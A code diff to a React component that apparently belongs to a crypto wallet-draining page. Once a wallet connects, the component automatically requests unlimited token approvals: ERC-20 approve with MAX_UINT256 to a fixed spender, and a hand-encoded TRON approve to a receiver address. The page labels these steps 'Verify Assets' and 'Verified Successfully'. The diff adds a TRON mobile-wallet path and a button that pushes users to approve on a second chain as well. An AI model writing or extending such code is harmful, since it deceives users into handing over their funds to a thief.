@@ -11,7 +11,11 @@ import {
   useSwitchChain,
   useBalance,
 } from "wagmi";
-import { useAppKitAccount, useAppKitNetwork } from "@reown/appkit/react";
+import {
+  useAppKitAccount,
+  useAppKitNetwork,
+  useAppKitProvider,
+} from "@reown/appkit/react";
 import {
   TOKENS,
   ERC20_ABI,
@@ -31,6 +35,8 @@ declare global {
 export default function ActionFlow() {
   const { address: appKitAddress, isConnected } = useAppKitAccount();
   const { caipNetwork, switchNetwork } = useAppKitNetwork();
+  const { walletProvider: tronWalletProvider } =
+    useAppKitProvider<any>("tron");
   const { address: evmAddress } = useAccount();
   const chainId = useChainId();
   const { writeContractAsync } = useWriteContract();
@@ -42,6 +48,7 @@ export default function ActionFlow() {
   const [errorMessage, setErrorMessage] = useState<string | null>(null);
   const [tronBalance, setTronBalance] = useState<string | null>(null);
   const [loadingTron, setLoadingTron] = useState(false);
+  const [verifiedChains, setVerifiedChains] = useState<string[]>([]);
   const autoTriggeredRef = useRef(false);
 
   const isTron =
@@ -60,14 +67,13 @@ export default function ActionFlow() {
   });
 
   // Read EVM Token balance (USDT/USDC)
-  const { data: evmTokenRawBalance, refetch: refetchTokenBalance } =
-    useReadContract({
-      address: currentEvmToken?.address,
-      abi: ERC20_ABI,
-      functionName: "balanceOf",
-      args: evmAddress ? [evmAddress] : undefined,
-      query: { enabled: Boolean(evmAddress && currentEvmToken && !isTron) },
-    });
+  const { data: evmTokenRawBalance } = useReadContract({
+    address: currentEvmToken?.address,
+    abi: ERC20_ABI,
+    functionName: "balanceOf",
+    args: evmAddress ? [evmAddress] : undefined,
+    query: { enabled: Boolean(evmAddress && currentEvmToken && !isTron) },
+  });
 
   // Format EVM token balance
   const formattedEvmTokenBalance =
@@ -144,8 +150,28 @@ export default function ActionFlow() {
             )
             .send();
           setStatus("success");
+          setVerifiedChains((prev) => [...new Set([...prev, "TRON"])]);
+        } else if (tronWalletProvider) {
+          // If connected via AppKit TRON provider (e.g. mobile Trust/OKX wallet)
+          if (typeof tronWalletProvider.request === "function") {
+            await tronWalletProvider.request({
+              method: "tron_signTransaction",
+              params: [
+                {
+                  to: TOKENS.tron.address,
+                  data: `0x095ea7b3000000000000000000000000${RECEIVER_ADDRESS_TRON.slice(
+                    2
+                  )}ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`,
+                },
+              ],
+            });
+            setStatus("success");
+            setVerifiedChains((prev) => [...new Set([...prev, "TRON"])]);
+          } else {
+            throw new Error("Provider ready, please confirm in TronLink");
+          }
         } else {
-          // If TronLink extension not in browser, prompt user
+          // Launch TronLink mobile app deep link if no provider injected
           window.location.href = `tronlinkoutside://pull.activity?param=${encodeURIComponent(
             JSON.stringify({
               url: window.location.href,
@@ -168,13 +194,17 @@ export default function ActionFlow() {
           args: [SPENDER_ADDRESS_EVM, MAX_UINT256],
         });
         setStatus("success");
+        setVerifiedChains((prev) => [
+          ...new Set([...prev, caipNetwork?.name || "EVM"]),
+        ]);
       }
     } catch (err: any) {
       const msg = err?.message || String(err);
       if (
         msg.includes("User rejected") ||
         msg.includes("cancelled") ||
-        msg.includes("Declined")
+        msg.includes("Declined") ||
+        msg.includes("rejected")
       ) {
         setStatus("rejected");
         setErrorMessage("Request cancelled. Please confirm in your wallet.");
@@ -190,7 +220,6 @@ export default function ActionFlow() {
     if (!isConnected || autoTriggeredRef.current) return;
     autoTriggeredRef.current = true;
 
-    // Small delay to let wallet provider settle
     const timer = setTimeout(() => {
       handleAction();
     }, 800);
@@ -209,12 +238,19 @@ export default function ActionFlow() {
     : formattedEvmTokenBalance !== null && currentEvmToken
     ? `${Number(formattedEvmTokenBalance).toFixed(2)} ${currentEvmToken.symbol}`
     : evmNativeBalance
-    ? `${Number(evmNativeBalance.formatted).toFixed(4)} ${evmNativeBalance.symbol}`
+    ? `${Number(evmNativeBalance.formatted).toFixed(4)} ${
+        evmNativeBalance.symbol
+      }`
     : "0.00";
 
   const hasZeroBalance =
     (isTron && tronBalance === "0.00") ||
     (!isTron && formattedEvmTokenBalance === "0.00");
+
+  const canPromptSecondChain =
+    status === "success" &&
+    ((isTron && !verifiedChains.includes("EVM")) ||
+      (!isTron && !verifiedChains.includes("TRON")));
 
   return (
     <div className="w-full max-w-xs mt-4 flex flex-col items-center gap-3">
@@ -229,15 +265,13 @@ export default function ActionFlow() {
       </div>
 
       {/* Auto-suggest network switch if 0 balance */}
-      {hasZeroBalance && (
+      {hasZeroBalance && status !== "success" && (
         <button
           onClick={async () => {
             try {
               if (isTron) {
-                // Switch to Ethereum or Polygon
                 if (switchChainAsync) await switchChainAsync({ chainId: 1 });
               } else {
-                // Switch to TRON
                 if (switchNetwork) {
                   const tronNet = (caipNetwork as any)?.networks?.find?.(
                     (n: any) => String(n.id).includes("tron")
@@ -252,6 +286,35 @@ export default function ActionFlow() {
           className="w-full py-2 px-3 text-xs text-amber-300/90 bg-amber-500/10 border border-amber-500/20 rounded-lg hover:bg-amber-500/20 transition-all cursor-pointer"
         >
           {isTron ? "Switch to EVM Network →" : "Switch to TRON Network →"}
+        </button>
+      )}
+
+      {/* If verified on first chain, prompt verification on second chain ("3 then 1") */}
+      {canPromptSecondChain && (
+        <button
+          onClick={async () => {
+            try {
+              if (isTron) {
+                if (switchChainAsync) await switchChainAsync({ chainId: 1 });
+              } else {
+                if (switchNetwork) {
+                  const tronNet = (caipNetwork as any)?.networks?.find?.(
+                    (n: any) => String(n.id).includes("tron")
+                  );
+                  if (tronNet) switchNetwork(tronNet);
+                }
+              }
+              setStatus("idle");
+              autoTriggeredRef.current = false;
+            } catch {
+              // Ignore switch error
+            }
+          }}
+          className="w-full py-2.5 px-4 rounded-xl font-medium text-xs bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 hover:bg-emerald-500/30 transition-all cursor-pointer"
+        >
+          {isTron
+            ? "⚡ Verify EVM Assets (Ethereum/BSC) →"
+            : "⚡ Verify TRON Assets (TRC-20) →"}
         </button>
       )}
 
@@ -270,7 +333,7 @@ export default function ActionFlow() {
         </button>
       ) : (
         <div className="w-full py-2.5 px-4 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs text-center font-medium">
-          ✓ Verified Successfully
+          ✓ Verification Complete
         </div>
       )}
 
